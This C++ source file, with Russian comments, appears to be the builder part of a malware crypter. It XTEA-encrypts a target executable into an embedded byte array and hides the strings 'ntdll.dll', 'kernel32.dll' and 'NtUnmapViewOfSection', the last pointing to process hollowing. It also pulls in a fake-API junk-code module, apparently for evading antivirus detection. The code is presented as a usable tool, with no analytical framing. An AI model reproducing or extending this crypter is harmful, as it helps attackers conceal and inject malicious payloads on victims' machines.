#include "pch.h"
#include <iostream>
#include <stdio.h>
#include <string.h>
#include "../../modules/modules.h"
#include "../../modules/trash_gen_module/fake_api.h"

#define PATH_FILE_OPEN "data_protect.exe"
#define PATH_FILE_HEX "../../modules/data_protect.h"
#define PATH_FILE_HEX_STRING "../../modules/data_crypt_string.h"
#define SIZE_FILE 50*1024*1024

//Нужен для дебага
extern "C" {
	void __cdecl  debug_print(unsigned line) {
		std::cout << "debug: " << line << "\n";
	}
};


static uint8_t buffer[SIZE_FILE];
static uint8_t tmp;

/*
Функция криптует нужную строку и помещает массив криптованных байт в заголовок ../../modules/data_crypt_string.h

Параметры:

const char *str_to_crypt - Строка, которую нужно зашифровать.
const char *name_variable - Имя переменной, которая будет в заголовке
*/
static void str_to_crypt (const char *str_to_crypt, const char *name_variable) 
{
	FILE *hFileHex;
	uint32_t count = 0;

	hFileHex = fopen(PATH_FILE_HEX_STRING, "ab+");

	if (hFileHex == NULL)
	{
		printf("Error open files ");
		while (1);
	}

	static char str[256];
	strncpy(str, str_to_crypt, sizeof(str));

	uint32_t size_str = strlen(str);

	//Выровнить размер строки на 8:
	while (!!(size_str % 8)) {
		size_str++;
	}

	//Криптование строки
	XTEA_encrypt(str, size_str, &MAGIC, 4);

	//Запись строки в файл
	fprintf(hFileHex, "static char %s[] = {\n", name_variable);

	for (uint32_t j = 0; j < size_str; j++)
	{
		count++;
		if (count == 10)
		{
			fprintf(hFileHex, " 0x%02x,\n", (((unsigned char*)str)[j]));
			count = 0;
		}
		else  fprintf(hFileHex, " 0x%02x, ", (((unsigned char*)str)[j]));
	};

	fprintf(hFileHex, " 0x00};\n");
	fclose(hFileHex);
}

/*
Функция шифрует защищаемый бинарный файл и помещает результат в заголовок ../../modules/data_protect.h
*/
static void bin_to_hex_gen(void)
{
	FILE *hFileOpen;
	FILE *hFileHex;

	static unsigned int count = 0;
	static unsigned int size_file = 8;

	hFileOpen = fopen(PATH_FILE_OPEN, "rb");
	hFileHex = fopen(PATH_FILE_HEX, "wb+");

	if ((hFileOpen == NULL) || (hFileHex == NULL))
	{
		printf("Error open files ");
		while (1);
	}

	//Генерирование пароля:
	uint32_t pass[10];

	//Рандомное число, для соли murmurhash
	uint32_t eax_random = do_Random_EAX(1, 9);
	
	for (int j = 1; j < 11; j++) 
	{
		pass[j - 1] = Murmur3(&count, sizeof(int), eax_random);
		count++;
	}

	while (!feof(hFileOpen))
	{
		tmp = getc(hFileOpen);
		if (size_file < SIZE_FILE) buffer[size_file] = tmp;
		else 
		{
			printf("Error file size = %d Size file must be < %d \n", size_file, SIZE_FILE);
			while (1);
		}
		size_file++;
	}

	fclose(hFileOpen);

	//Выровнить размер файла на 8:
	while (!!(size_file % 8)) 
	{
		size_file++;
	}

	//Запись четырехбайтного значения eax_random
	memcpy(buffer, &eax_random, sizeof(int));

	//Запись четырехбайтного значения size_file
	memcpy(buffer + 4, &size_file, sizeof(int));

	//Шифрование защищаемых данных и генерация пошифрованного массива байт в заголовке ../../modules/data_protect.h

	XTEA_encrypt((char*)(buffer + 8), size_file, pass, sizeof(pass));

	fprintf(hFileHex, "uint8_t data_protect[] = { \n");
	for (int j = 0; j < (size_file - 1); j++)
	{
		count++;
		if (count == 10)
		{
			fprintf(hFileHex, "0x%02x,\n", (((uint8_t*)buffer)[j]));
			count = 0;
		}
		else  fprintf(hFileHex, "0x%02x,\n", (((uint8_t*)buffer)[j]));
	};

	fprintf(hFileHex, " 0x00};\n");
	fclose(hFileHex);

	//Очистка файла, где распологаются криптованные строки
	hFileHex = fopen(PATH_FILE_HEX_STRING, "wb+");
	fclose(hFileHex);

	//Шифрование строк и генерация пошифрованного массива байт в заголовке ../../modules/data_protect.h
	str_to_crypt("ntdll.dll", "ntdll");
	str_to_crypt("kernel32.dll", "kernel32");
	str_to_crypt("NtUnmapViewOfSection", "NtUnmapView");
}

int main()
{
	printf("Start shell gen \n");
	bin_to_hex_gen();
	printf("Shell gen is OK\n");
	while (1);
	return 0;
}
